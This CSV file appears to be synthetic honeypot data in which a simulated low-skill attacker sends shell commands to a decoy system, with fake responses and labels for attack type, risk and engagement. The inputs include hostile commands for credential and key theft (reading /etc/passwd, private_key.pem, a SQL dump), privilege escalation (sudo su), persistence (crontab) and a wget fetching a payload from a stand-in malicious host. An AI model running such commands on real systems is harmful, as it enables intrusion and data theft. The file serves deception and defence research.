session_id,attacker_id,attacker_profile,timestamp,attacker_input,honeypot_response,attack_type,risk_level,response_success,current_privileges,failed_attempts,session_position,attack_phase,engagement_time,hawkes_intensity,frustration_level,temporal_phase,deception_triggered,data_collected,privilege_escalation_attempt,high_risk_activity,system_state_hash,time_since_session_start,commands_per_minute
1,0,script_kiddie,2025-05-24 23:37:17.834002,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,False,0,11,initial_recon,0.1017608725336796,0.135469353677497,0.0,initial_recon,1,1,0,1,-8958916735605131775,8.78399925313834,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:17.935763,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,False,0,12,initial_recon,0.134477610479413,0.1228032771792579,0.0,initial_recon,1,0,0,0,-8958916735605131775,8.918476863617753,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:18.070241,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,False,0,13,initial_recon,0.7051512412941352,0.1146262322093389,0.0,initial_recon,1,1,0,0,-8958916735605131775,9.623628104911887,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:18.775392,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,False,0,14,initial_recon,0.1265144723785069,0.1095129534387554,0.0,initial_recon,1,0,0,0,-8958916735605131775,9.750142577290395,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:18.901907,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,False,0,15,initial_recon,0.1,0.1060613265116197,0.0,initial_recon,1,1,0,0,-8958916735605131775,9.850142577290397,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:19.001907,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,False,0,16,initial_recon,0.1,0.1038508128514845,0.0,initial_recon,1,1,0,1,-8958916735605131775,9.950142577290396,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:19.101907,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,False,0,17,initial_recon,0.3046288439423881,0.1024414347086292,0.0,initial_recon,1,0,0,0,-8958916735605131775,10.254771421232784,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:19.406535,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,False,0,18,initial_recon,0.8389869564725416,0.1015518882864747,0.0,initial_recon,1,1,0,1,-8958916735605131775,11.093758377705326,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:20.245522,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,False,0,19,initial_recon,0.1,0.1009975867854132,0.0,initial_recon,1,0,0,0,-8958916735605131775,11.193758377705326,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:20.345522,whoami,user,reconnaissance,1,False,False,1,20,initial_recon,0.1,0.1006286738406588,0.0,initial_recon,1,0,0,0,-8958916735605131775,11.293758377705323,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:20.445522,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,False,0,21,initial_recon,0.1,0.1003956282494999,0.2,initial_recon,1,0,0,0,-8958916735605131775,11.393758377705328,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:20.545522,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,False,0,22,initial_recon,0.9625565689463303,0.1002486451451595,0.1,initial_recon,1,1,0,0,-8958916735605131775,12.356314946651656,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:21.508079,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,False,0,23,initial_recon,0.1740771298039386,0.1001589186186086,0.0,initial_recon,1,0,0,0,-8958916735605131775,12.530392076455596,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:21.682156,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,False,0,24,initial_recon,0.2939371347330649,0.1000997044080822,0.0,initial_recon,1,1,0,0,-8958916735605131775,12.82432921118866,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:21.976093,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,False,0,25,initial_recon,0.1,0.1000626088651167,0.0,initial_recon,1,1,0,0,-8958916735605131775,12.92432921118866,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:22.076093,find / -name '*.key',Command not found,data_exfiltration,3,False,False,1,26,initial_recon,1.492829583937442,0.1000391495130929,0.0,initial_recon,1,0,0,0,-8958916735605131775,14.417158795126102,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:23.568923,find / -name '*.key',Command not found,data_exfiltration,3,False,False,2,27,initial_recon,2.252718994315551,0.1000251757777439,0.2,initial_recon,1,0,0,0,-8958916735605131775,16.669877789441653,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:25.821642,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,False,1,28,initial_recon,1.2749285083089534,0.1000165384599245,0.4,initial_recon,1,1,0,1,-8958916735605131775,17.944806297750606,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:27.096570,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,False,0,29,initial_recon,0.1,0.1000105029783784,0.3,initial_recon,1,0,0,0,-8958916735605131775,18.044806297750608,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:27.196570,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,False,0,30,initial_recon,0.1574231128982092,0.1000065294402408,0.2,initial_recon,1,1,0,0,-8958916735605131775,18.202229410648812,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:27.353993,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,False,0,31,initial_recon,0.1,0.1000040595916982,0.1,initial_recon,1,0,0,0,-8958916735605131775,18.302229410648817,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:27.453993,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,False,1,32,initial_recon,0.2647428731414782,0.1000025207824102,2.775557561562892e-17,initial_recon,1,0,0,1,-8958916735605131775,18.56697228379029,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:27.718736,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,False,0,33,initial_recon,0.1877806433300573,0.1000015674705776,0.2,initial_recon,1,0,0,0,-8958916735605131775,18.75475292712035,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:27.906517,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,False,0,34,initial_recon,0.1620499366507372,0.1000009732114957,0.1,initial_recon,1,0,0,0,-8958916735605131775,18.91680286377109,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:28.068567,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,False,0,35,initial_recon,1.733669002809274,0.1000006037506308,2.775557561562892e-17,initial_recon,1,1,0,0,-8958916735605131775,20.65047186658036,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:29.802236,sudo su,Permission denied,privilege_escalation,5,True,True,0,36,initial_recon,0.1,0.1000003841170341,0.0,initial_recon,1,0,1,1,-8958916735605131775,20.75047186658036,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:29.902236,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,37,initial_recon,0.1689900795756641,0.1000002377820094,0.2,initial_recon,1,0,0,0,-8958916735605131775,20.919461946156023,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:30.071226,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,38,initial_recon,0.5222659324861357,0.1000001472376466,0.1,initial_recon,1,1,0,0,-8958916735605131775,21.44172787864216,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:30.593492,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,39,initial_recon,0.1,0.1000000914865487,0.0,initial_recon,1,0,0,0,-8958916735605131775,21.541727878642163,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:30.693492,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,40,initial_recon,0.1,0.1000000565611469,0.2,initial_recon,1,1,0,0,-8958916735605131775,21.64172787864216,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:30.793492,crontab -e,Command executed,persistence,3,True,True,0,41,initial_recon,0.4881507664946914,0.1000000349561192,0.1,initial_recon,1,0,0,0,-8958916735605131775,22.129878645136856,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:31.281643,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,42,initial_recon,0.1,0.1000000216806818,0.0,initial_recon,1,0,0,0,-8958916735605131775,22.229878645136854,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:31.381643,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,43,initial_recon,0.1,0.1000000133891381,0.0,initial_recon,1,0,0,0,-8958916735605131775,22.32987864513685,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:31.481643,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,44,initial_recon,1.014889442816452,0.1000000082659682,0.0,initial_recon,1,0,0,0,-8958916735605131775,23.344768087953305,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:32.496532,crontab -e,Command executed,persistence,3,False,True,2,45,initial_recon,0.3195330831523066,0.1000000051525659,0.2,initial_recon,1,0,0,0,-8958916735605131775,23.664301171105613,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:32.816065,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,1,46,initial_recon,0.1998602214556824,0.1000000031847391,0.4,initial_recon,1,0,0,0,-8958916735605131775,23.864161392561297,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:33.015925,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,47,initial_recon,0.329555004432272,0.1000000019656629,0.3,initial_recon,1,1,0,0,-8958916735605131775,24.193716396993565,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:33.345480,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,48,initial_recon,0.6808147397770841,0.1000000012142519,0.2,initial_recon,1,0,0,0,-8958916735605131775,24.874531136770653,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:34.026295,whoami,user,reconnaissance,1,False,True,2,49,initial_recon,0.1,0.1000000007523992,0.4,initial_recon,1,0,0,0,-8958916735605131775,24.97453113677065,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:34.126295,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,1,50,initial_recon,0.1,0.1000000004635744,0.6000000000000001,initial_recon,1,0,0,0,-8958916735605131775,25.07453113677065,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:34.226295,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,51,initial_recon,1.2166144496503912,0.1000000002855521,0.5000000000000001,initial_recon,1,1,0,0,-8958916735605131775,26.29114558642104,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:35.442910,crontab -e,Command executed,persistence,3,True,True,0,52,initial_recon,0.1433694117466159,0.100000000177839,0.4000000000000001,initial_recon,1,0,0,0,-8958916735605131775,26.434514998167657,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:35.586279,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,53,initial_recon,0.5634996596325302,0.1000000001095114,0.3000000000000001,initial_recon,1,1,0,0,-8958916735605131775,26.998014657800187,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:36.149779,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,54,initial_recon,0.1,0.1000000000676543,0.2000000000000001,initial_recon,1,0,0,0,-8958916735605131775,27.09801465780019,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:36.249779,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,55,initial_recon,0.1,0.100000000041627,0.1000000000000001,initial_recon,1,1,0,0,-8958916735605131775,27.19801465780019,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:36.349779,crontab -e,Command executed,persistence,3,True,True,0,56,initial_recon,0.8254435404536618,0.1000000000256077,1.3877787807814454e-16,initial_recon,1,0,0,0,-8958916735605131775,28.02345819825385,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:37.175222,whoami,user,reconnaissance,1,True,True,0,57,initial_recon,0.1230911838507528,0.1000000000158451,0.0,initial_recon,1,0,0,0,-8958916735605131775,28.1465493821046,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:37.298313,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,58,initial_recon,0.206495476378761,0.1000000000097445,0.0,initial_recon,1,0,0,0,-8958916735605131775,28.353044858483365,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:37.504809,crontab -e,Command executed,persistence,3,False,True,2,59,initial_recon,0.3875499510063197,0.100000000005995,0.2,initial_recon,1,0,0,0,-8958916735605131775,28.74059480948968,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:37.892359,find / -name '*.key',Command not found,data_exfiltration,3,False,True,3,60,initial_recon,2.264242649369833,0.1000000000036922,0.4,initial_recon,1,0,0,0,-8958916735605131775,31.00483745885952,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:40.156601,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,2,61,initial_recon,0.4936182614812617,0.1000000000023266,0.6000000000000001,initial_recon,1,0,0,0,-8958916735605131775,31.49845572034078,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:40.650220,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,1,62,initial_recon,3.6385493484850944,0.1000000000014329,0.5000000000000001,initial_recon,1,1,0,0,-8958916735605131775,35.13700506882587,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:44.288769,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,63,initial_recon,0.1,0.1000000000009327,0.4000000000000001,initial_recon,1,0,0,0,-8958916735605131775,35.23700506882587,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:44.388769,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,64,initial_recon,0.1004669353109049,0.1000000000005724,0.3000000000000001,initial_recon,1,1,0,0,-8958916735605131775,35.33747200413678,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:44.489236,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,65,initial_recon,0.1,0.1000000000003512,0.2000000000000001,initial_recon,1,0,0,0,-8958916735605131775,35.43747200413678,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:44.589236,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,66,initial_recon,0.1951919014411579,0.1000000000002155,0.1000000000000001,initial_recon,1,1,0,1,-8958916735605131775,35.632663905577935,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:44.784428,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,67,initial_recon,0.6070434884412301,0.1000000000001322,1.3877787807814454e-16,initial_recon,1,1,0,1,-8958916735605131775,36.23970739401916,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:45.391471,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,68,initial_recon,0.8562715531907037,0.1000000000000812,0.0,initial_recon,1,0,0,0,-8958916735605131775,37.09597894720987,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:46.247743,crontab -e,Command executed,persistence,3,False,True,1,69,initial_recon,0.1450306474961753,0.1000000000000501,0.0,initial_recon,1,0,0,0,-8958916735605131775,37.24100959470604,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:46.392774,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,70,initial_recon,0.1789652300395785,0.1000000000000308,0.2,initial_recon,1,1,0,1,-8958916735605131775,37.41997482474562,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:46.571739,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,71,initial_recon,0.1,0.1000000000000187,0.1,initial_recon,1,0,0,0,-8958916735605131775,37.51997482474562,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:46.671739,whoami,user,reconnaissance,1,False,True,1,72,initial_recon,0.1,0.1000000000000117,0.0,initial_recon,1,0,0,0,-8958916735605131775,37.619974824745626,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:46.771739,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,73,initial_recon,0.1,0.1000000000000069,0.2,initial_recon,1,0,0,0,-8958916735605131775,37.71997482474562,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:46.871739,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,74,initial_recon,0.1369302760710443,0.1000000000000042,0.1,initial_recon,1,1,0,1,-8958916735605131775,37.85690510081667,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:47.008669,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,75,initial_recon,0.1075635375157846,0.1000000000000026,0.0,initial_recon,1,0,0,0,-8958916735605131775,37.964468638332455,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:47.116233,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,76,initial_recon,0.1385724067798651,0.1000000000000014,0.0,initial_recon,1,1,0,1,-8958916735605131775,38.10304104511232,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:47.254805,sudo su,Command executed,privilege_escalation,5,True,True,0,77,initial_recon,0.5735550504957919,0.1000000000000011,0.0,initial_recon,1,0,1,1,-8958916735605131775,38.67659609560811,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:47.828360,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,78,initial_recon,0.2084398285587714,0.1000000000000004,0.0,initial_recon,1,0,0,0,-8958916735605131775,38.88503592416688,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:48.036800,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,79,initial_recon,0.4002014990927089,0.1000000000000001,0.0,initial_recon,1,1,0,0,-8958916735605131775,39.28523742325959,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:48.437001,whoami,user,reconnaissance,1,True,True,0,80,initial_recon,0.1,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,39.38523742325959,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:48.537001,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,81,initial_recon,0.1803644794246297,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,39.56560190268422,16.76279621070162
